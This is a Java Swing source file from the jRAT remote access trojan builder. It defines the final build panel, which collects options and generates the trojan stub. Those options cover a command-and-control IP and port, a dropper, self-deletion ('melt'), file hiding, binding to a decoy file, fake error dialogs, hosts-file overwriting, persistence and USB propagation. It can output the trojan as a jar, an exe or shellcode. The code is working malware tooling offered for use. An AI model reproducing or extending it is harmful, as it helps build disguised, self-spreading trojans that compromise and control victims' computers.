package pro.jrat.ui.panels;

import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.File;
import java.io.IOException;
import java.security.InvalidKeyException;
import java.util.LinkedHashMap;

import javax.swing.BorderFactory;
import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JFileChooser;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JProgressBar;
import javax.swing.JScrollPane;
import javax.swing.JTable;
import javax.swing.JTextField;
import javax.swing.LayoutStyle.ComponentPlacement;
import javax.swing.ScrollPaneConstants;
import javax.swing.table.DefaultTableModel;

import pro.jrat.BuildStatus;
import pro.jrat.ErrorDialog;
import pro.jrat.OSConfig;
import pro.jrat.ShellcodeGenerator;
import pro.jrat.build.Build;
import pro.jrat.build.BuildExecutable;
import pro.jrat.common.crypto.Crypto;
import pro.jrat.common.crypto.EncryptionKey;
import pro.jrat.extensions.PluginList;
import pro.jrat.extensions.StubPlugin;
import pro.jrat.io.Files;
import pro.jrat.listeners.AdvancedBuildListener;
import pro.jrat.settings.Settings;
import pro.jrat.ui.frames.FrameBuild;
import pro.jrat.ui.renderers.table.BuildTableRenderer;


@SuppressWarnings("serial")
public class PanelBuildFinal extends JPanel {

	public FrameBuild holder;
	private JTextField txtOutput;
	private JLabel lblExpectedSizeUnknown;
	private JProgressBar progressBar;
	private JLabel lblStatus;
	private PanelBuildFinal frame;
	private JButton btnBuild;
	private LinkedHashMap<String, BuildStatus> statuses = new LinkedHashMap<String, BuildStatus>();
	private JTable table;
	
	public DefaultTableModel getModel() {
		return (DefaultTableModel)table.getModel();
	}

	public LinkedHashMap<String, BuildStatus> getStatuses() {
		return statuses;
	}

	public void setStatus(String s, BuildStatus status) {
		lblStatus.setText(s);
	}

	public void setValue(int i) {
		progressBar.setValue(i);
		repaint();
	}

	public JLabel getStatusLabel() {
		return lblStatus;
	}

	public JButton getBuildButton() {
		return btnBuild;
	}

	public void log(String message, BuildStatus status) {
		try {
			statuses.put(message, status);
			((DefaultTableModel) table.getModel()).addRow(new Object[] { message });
			table.scrollRectToVisible(table.getCellRect(table.getRowCount(), 0, false));
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

	public PanelBuildFinal(FrameBuild frame) {

		holder = frame;
		this.frame = this;

		JPanel panel = new JPanel();
		panel.setBorder(BorderFactory.createTitledBorder("Finalize and build server"));
		GroupLayout groupLayout = new GroupLayout(this);
		groupLayout.setHorizontalGroup(groupLayout.createParallelGroup(Alignment.LEADING).addGroup(groupLayout.createSequentialGroup().addContainerGap().addComponent(panel, GroupLayout.PREFERRED_SIZE, 426, GroupLayout.PREFERRED_SIZE).addContainerGap(14, Short.MAX_VALUE)));
		groupLayout.setVerticalGroup(groupLayout.createParallelGroup(Alignment.LEADING).addGroup(groupLayout.createSequentialGroup().addContainerGap().addComponent(panel, GroupLayout.PREFERRED_SIZE, 273, GroupLayout.PREFERRED_SIZE).addContainerGap(16, Short.MAX_VALUE)));

		btnBuild = new JButton("Build");
		btnBuild.setIcon(new ImageIcon(PanelBuildFinal.class.getResource("/icons/final.png")));
		btnBuild.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				perform();
			}
		});

		JLabel lblOutput = new JLabel("Output");

		txtOutput = new JTextField();
		txtOutput.setEditable(false);
		txtOutput.setColumns(10);

		JButton button = new JButton("");
		button.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				JFileChooser f = new JFileChooser();
				f.showSaveDialog(null);
				File file = f.getSelectedFile();
				if (file != null) {
					txtOutput.setText(file.getAbsolutePath());
				}
			}
		});
		button.setIcon(new ImageIcon(PanelBuildFinal.class.getResource("/icons/folder.png")));

		lblExpectedSizeUnknown = new JLabel("Expected size: Unknown");

		JButton button_1 = new JButton("");
		button_1.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				formatLbl();
			}
		});
		button_1.setIcon(new ImageIcon(PanelBuildFinal.class.getResource("/icons/refresh.png")));

		progressBar = new JProgressBar();

		lblStatus = new JLabel("Idle...");

		JScrollPane scrollPane = new JScrollPane();
		scrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);
		GroupLayout gl_panel = new GroupLayout(panel);
		gl_panel.setHorizontalGroup(gl_panel.createParallelGroup(Alignment.TRAILING).addGroup(gl_panel.createSequentialGroup().addContainerGap().addGroup(gl_panel.createParallelGroup(Alignment.LEADING).addComponent(scrollPane, Alignment.TRAILING, GroupLayout.DEFAULT_SIZE, 394, Short.MAX_VALUE).addGroup(Alignment.TRAILING, gl_panel.createSequentialGroup().addComponent(progressBar, GroupLayout.DEFAULT_SIZE, 279, Short.MAX_VALUE).addPreferredGap(ComponentPlacement.RELATED).addComponent(btnBuild, GroupLayout.PREFERRED_SIZE, 109, GroupLayout.PREFERRED_SIZE)).addGroup(gl_panel.createSequentialGroup().addComponent(lblOutput).addPreferredGap(ComponentPlacement.RELATED).addComponent(txtOutput, GroupLayout.PREFERRED_SIZE, 262, GroupLayout.PREFERRED_SIZE).addPreferredGap(ComponentPlacement.RELATED).addComponent(button)).addGroup(gl_panel.createSequentialGroup().addComponent(lblExpectedSizeUnknown).addPreferredGap(ComponentPlacement.RELATED).addComponent(button_1)).addComponent(lblStatus)).addContainerGap()));
		gl_panel.setVerticalGroup(gl_panel.createParallelGroup(Alignment.LEADING).addGroup(gl_panel.createSequentialGroup().addGap(16).addGroup(gl_panel.createParallelGroup(Alignment.TRAILING).addGroup(gl_panel.createParallelGroup(Alignment.BASELINE).addComponent(lblOutput).addComponent(txtOutput, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)).addComponent(button)).addPreferredGap(ComponentPlacement.RELATED).addGroup(gl_panel.createParallelGroup(Alignment.TRAILING).addComponent(lblExpectedSizeUnknown, GroupLayout.DEFAULT_SIZE, 25, Short.MAX_VALUE).addComponent(button_1)).addPreferredGap(ComponentPlacement.RELATED).addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 103, GroupLayout.PREFERRED_SIZE).addPreferredGap(ComponentPlacement.RELATED).addComponent(lblStatus).addPreferredGap(ComponentPlacement.RELATED).addGroup(gl_panel.createParallelGroup(Alignment.LEADING, false).addComponent(progressBar, GroupLayout.DEFAULT_SIZE, GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE).addComponent(btnBuild, GroupLayout.DEFAULT_SIZE, 32, Short.MAX_VALUE)).addContainerGap()));

		table = new JTable();
		table.setModel(new DefaultTableModel(new Object[][] {}, new String[] { "New column" }));
		table.setTableHeader(null);
		table.setRowHeight(25);
		table.setDefaultRenderer(Object.class, new BuildTableRenderer(getStatuses()));
		scrollPane.setViewportView(table);
		panel.setLayout(gl_panel);
		setLayout(groupLayout);

	}

	public void perform() {
		new Thread() {
			public void run() {
				try {
					PanelBuildBinder binder = (PanelBuildBinder) holder.panels.get("binder");
					PanelBuildGeneral general = (PanelBuildGeneral) holder.panels.get("general");
					PanelBuildInstallMessage message = (PanelBuildInstallMessage) holder.panels.get("install message");

					PanelBuildNetwork network = (PanelBuildNetwork) holder.panels.get("network");
					PanelBuildStartup startup = (PanelBuildStartup) holder.panels.get("startup");
					PanelBuildMutex mutex = (PanelBuildMutex) holder.panels.get("mutex");
					PanelBuildOS os = (PanelBuildOS) holder.panels.get("allowed os");
					PanelBuildPlugins pl = (PanelBuildPlugins) holder.panels.get("plugins");
					PanelBuildTimeout ti = (PanelBuildTimeout) holder.panels.get("timeout");
					PanelBuildDelay de = (PanelBuildDelay) holder.panels.get("delay");
					PanelBuildHostFile host = (PanelBuildHostFile) holder.panels.get("host file");
					PanelBuildVisibility vis = (PanelBuildVisibility) holder.panels.get("tray icon");
					PanelBuildError err = (PanelBuildError) holder.panels.get("error handling");
					PanelBuildPersistance per = (PanelBuildPersistance) holder.panels.get("persistance");
					PanelBuildUSB pusb = (PanelBuildUSB) holder.panels.get("usb");
					PanelBuildDebugMessages pdebug = (PanelBuildDebugMessages) holder.panels.get("debug messages");
					PanelBuildOutput out = (PanelBuildOutput) holder.panels.get("output");

					String file = txtOutput.getText().trim();
					String ip = network.getIP();
					int port = network.getPort();
					String ID = general.getID();
					String pass = general.getPass();
					EncryptionKey key = general.getKey();
					boolean crypt = startup.dropper();
					String droppath = startup.droploc();
					int reconSec = network.getConnectionRate();
					String name = startup.getJarname();
					boolean fakewindow = message.shouldShowDialog();
					String faketitle = message.getTitle();
					String fakemessage = message.getMsg();
					int fakeicon = message.getIcon();
					boolean melt = startup.melt();
					boolean hiddenFile = startup.hideFile();
					boolean bind = binder.shouldBind();
					String bindpath = binder.getFile();
					String bindname = binder.getName();
					String binddrop = binder.dropTarget();
					boolean usemutex = mutex.useMutex();
					int mutexport = mutex.mutexPort();
					PluginList plist = pl.getList();
					boolean timeout = ti.enabled();
					int timeoutms = ti.getSecondsAsMilli();
					boolean delay = de.delay();
					int delayms = de.getDelayAsSeconds();
					boolean usehost = host.enabled();
					String hosttext = host.getText();
					boolean overwritehost = host.overwrite();
					boolean trayicon = vis.useIcon();
					String icon = vis.getIcon();
					String traymsg = vis.getConnectMessage();
					String traymsgfail = vis.getDisconnectMessage();
					String traytitle = vis.getTitle();
					boolean handleerr = err.errorLogging();
					boolean persistance = per.isPersistanceEnabled();
					int persistancems = per.getMS();
					boolean usb = pusb.copyToUsb();
					String usbexclude = pusb.getExclude();
					String usbname = pusb.getNameOfFile();
					boolean debugmsg = pdebug.keepDebugMessages();
					OSConfig osconfig = os.getConfig();

					if (key.getTextualKey().length() != Crypto.KEY_LENGTH) {
						throw new InvalidKeyException("Encryption key has to be " + Crypto.KEY_LENGTH + " chars");
					}

					if (file.length() == 0) {
						throw new IOException("Invalid output file");
					}

					if (out.useShellcode()) {
						File temp = File.createTempFile("jratbuild", ".jar");
						Build.build(new AdvancedBuildListener(frame), Files.getStub(), temp, ip, port, ID, pass, key, crypt, droppath, reconSec, name, fakewindow, faketitle, fakemessage, fakeicon, melt, hiddenFile, bind, bindpath, bindname, binddrop, usemutex, mutexport, plist, timeout, timeoutms, delay, delayms, usehost, hosttext, overwritehost, trayicon, icon, traymsg, traymsgfail, traytitle, handleerr, persistance, persistancems, usb, usbexclude, usbname, debugmsg, osconfig, true);

						if (!file.endsWith(".jar")) {
							file = file + ".jar";
						}

						ShellcodeGenerator.generate(temp, new File(file), out.getShellcode(), "byteArray");
						temp.delete();
					} else if (out.useExe()) {
						File temp = File.createTempFile("jratbuild", ".jar");

						Build.build(new AdvancedBuildListener(frame), Files.getStub(), temp, ip, port, ID, pass, key, crypt, droppath, reconSec, name, fakewindow, faketitle, fakemessage, fakeicon, melt, hiddenFile, bind, bindpath, bindname, binddrop, usemutex, mutexport, plist, timeout, timeoutms, delay, delayms, usehost, hosttext, overwritehost, trayicon, icon, traymsg, traymsgfail, traytitle, handleerr, persistance, persistancems, usb, usbexclude, usbname, debugmsg, osconfig, true);

						BuildExecutable.build(temp.getAbsolutePath(), file, out.frame);

						temp.delete();
					} else {
						Build.build(new AdvancedBuildListener(frame), Files.getStub(), new File(file), ip, port, ID, pass, key, crypt, droppath, reconSec, name, fakewindow, faketitle, fakemessage, fakeicon, melt, hiddenFile, bind, bindpath, bindname, binddrop, usemutex, mutexport, plist, timeout, timeoutms, delay, delayms, usehost, hosttext, overwritehost, trayicon, icon, traymsg, traymsgfail, traytitle, handleerr, persistance, persistancems, usb, usbexclude, usbname, debugmsg, osconfig, true);
					}

					Settings.getGlobal().setVal("brecat", reconSec);
					Settings.getGlobal().setVal("jarname", name);
					Settings.getGlobal().setVal("bip", ip);
					Settings.getGlobal().setVal("bport", port);
					Settings.getGlobal().setVal("bid", ID);
					Settings.getGlobal().setVal("bkey", key.getTextualKey());
					Settings.getGlobal().setVal("bpass", pass);
					Settings.getGlobal().setVal("bcrypt", crypt);
					Settings.getGlobal().save();
				} catch (Exception ex) {
					ErrorDialog.create(ex);
					ex.printStackTrace();
				}
			}
		}.start();
	}

	public void formatLbl() {
		PanelBuildBinder binder = (PanelBuildBinder) holder.panels.get("binder");
		PanelBuildStartup startup = (PanelBuildStartup) holder.panels.get("startup");
		PanelBuildPlugins plugins = (PanelBuildPlugins) holder.panels.get("plugins");

		int size = (int) Files.getStub().length() / 1024;

		if (binder.shouldBind()) {
			File bind = new File(binder.getFile());
			if (bind.exists()) {
				size += bind.length() / 1024;
			}
		}

		if (startup.dropper()) {
			size += 10;
		}

		PluginList list = plugins.getList();
		if (list != null) {
			for (StubPlugin p : list.plugins) {
				size += new File(p.path).length() / 1024;
			}
		}

		this.lblExpectedSizeUnknown.setText("Expected size: " + size + " kb");
	}

	public void clearRows() {
		while (getModel().getRowCount() > 0) {
			getModel().removeRow(0);
		}
	}
}
